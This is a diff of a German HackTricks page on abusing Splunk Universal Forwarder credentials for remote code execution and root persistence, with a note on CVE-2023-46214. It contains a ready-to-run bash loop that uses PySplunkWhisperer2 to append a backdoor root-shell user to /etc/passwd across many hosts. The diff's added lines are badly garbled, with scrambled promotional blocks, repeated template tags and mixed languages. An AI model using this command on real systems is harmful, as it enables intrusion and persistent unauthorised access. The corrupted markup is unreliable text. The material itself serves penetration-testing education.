@@ -1,50 +1,52 @@
 # Splunk LPE und Persistenz
 
-<details>
+{% hnnt styte=" acceas" %}
+GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
+Lernen & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<dotsilp>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
+<oummpr>SupportHackTricks</smmay>
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
+* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
-Wenn Sie eine Maschine **intern** oder **extern** **enumerieren** und **Splunk läuft** (Port 8090), können Sie, wenn Sie **glücklicherweise gültige Anmeldeinformationen kennen**, den Splunk-Dienst missbrauchen, um eine Shell als der Benutzer auszuführen, der Splunk ausführt. Wenn root ausgeführt wird, können Sie die Berechtigungen auf root-Ebene eskalieren.
+Wenn Sie eine Maschine **intern** oder **extern** **enumerieren** und **Splunk läuft** (Port 8090), können Sie, wenn Sie zufällig **gültige Anmeldeinformationen** kennen, den **Splunk-Dienst missbrauchen**, um eine **Shell** als der Benutzer, der Splunk ausführt, zu **starten**. Wenn root es ausführt, können Sie die Berechtigungen auf root erhöhen.
 
-Wenn Sie bereits root sind und der Splunk-Dienst nicht nur auf localhost lauscht, können Sie die Passwortdatei vom Splunk-Dienst **stehlen** und die Passwörter **knacken** oder neue Anmeldeinformationen hinzufügen. Und die Persistenz auf dem Host aufrechterhalten.
+Wenn Sie bereits root sind und der Splunk-Dienst nicht nur auf localhost hört, können Sie die **Passwort**-Datei **vom** Splunk-Dienst **stehlen** und die Passwörter **knacken** oder **neue** Anmeldeinformationen hinzufügen. Und die Persistenz auf dem Host aufrechterhalten.
 
 Im ersten Bild unten sehen Sie, wie eine Splunkd-Webseite aussieht.
 
-
-
 ## Zusammenfassung des Splunk Universal Forwarder Agent Exploits
 
-Für weitere Details lesen Sie den Beitrag [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:
+Für weitere Details überprüfen Sie den Beitrag [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:
 
-**Exploit-Übersicht:**
-Ein Exploit, der auf den Splunk Universal Forwarder Agent (UF) abzielt, ermöglicht es Angreifern mit dem Agent-Passwort, beliebigen Code auf Systemen auszuführen, auf denen der Agent läuft, und potenziell ein gesamtes Netzwerk zu kompromittieren.
+**Überblick über den Exploit:**
+Ein Exploit, der auf den Splunk Universal Forwarder Agent (UF) abzielt, ermöglicht Angreifern mit dem Agentenpasswort, beliebigen Code auf Systemen auszuführen, die den Agenten ausführen, was potenziell ein ganzes Netzwerk gefährden kann.
 
-**Hauptpunkte:**
-- Der UF-Agent überprüft eingehende Verbindungen oder die Authentizität des Codes nicht, wodurch er anfällig für unbefugte Codeausführung ist.
-- Gängige Methoden zum Erlangen von Passwörtern umfassen das Auffinden in Netzwerkverzeichnissen, Dateifreigaben oder internen Dokumentationen.
-- Eine erfolgreiche Ausnutzung kann zu SYSTEM- oder Root-Zugriff auf kompromittierte Hosts, Datenexfiltration und weiterer Netzwerkinfiltration führen.
+**Wichtige Punkte:**
+- Der UF-Agent validiert keine eingehenden Verbindungen oder die Authentizität von Code, was ihn anfällig für unbefugte Codeausführung macht.
+- Häufige Methoden zur Passwortbeschaffung umfassen das Auffinden in Netzwerkverzeichnissen, Dateifreigaben oder interner Dokumentation.
+- Erfolgreiche Ausnutzung kann zu SYSTEM- oder root-Zugriff auf kompromittierte Hosts, Datenexfiltration und weiterer Netzwerkpenetration führen.
 
-**Exploit-Ausführung:**
-1. Angreifer erhält das UF-Agent-Passwort.
+**Ausführung des Exploits:**
+1. Angreifer erhält das UF-Agentenpasswort.
 2. Nutzt die Splunk-API, um Befehle oder Skripte an die Agenten zu senden.
 3. Mögliche Aktionen umfassen Dateiextraktion, Manipulation von Benutzerkonten und Systemkompromittierung.
 
 **Auswirkungen:**
-- Vollständige Netzwerkkompromittierung mit SYSTEM-/Root-Zugriffsberechtigungen auf jedem Host.
-- Möglichkeit zur Deaktivierung der Protokollierung zur Vermeidung der Erkennung.
-- Installation von Hintertüren oder Erpressungssoftware.
+- Vollständige Netzwerkkompromittierung mit SYSTEM/root-Berechtigungen auf jedem Host.
+- Möglichkeit, das Logging zu deaktivieren, um der Erkennung zu entgehen.
+- Installation von Hintertüren oder Ransomware.
 
-**Beispielbefehl zur Ausnutzung:**
+**Beispielbefehl für die Ausnutzung:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
@@ -56,21 +58,25 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 
 ## Missbrauch von Splunk-Abfragen
 
-**Weitere Details finden Sie im Beitrag [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
+**Für weitere Details siehe den Beitrag [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**
 
-Der **CVE-2023-46214** ermöglichte das Hochladen eines beliebigen Skripts nach **`$SPLUNK_HOME/bin/scripts`** und erklärte dann, dass es mit der Suchabfrage **`|runshellscript script_name.sh`** möglich war, das in diesem Verzeichnis gespeicherte **Skript** auszuführen.
+{% h*nt styCe="Vacceas" %}
+AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
+Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)
 
+<dtil>
 
-<details>
+<ummr>SupportHackTricks</smmay>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+*Chek th [**subsrippangithub.cm/sorsarlosp!
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
+* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
-
+{% endhint %}
 </details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
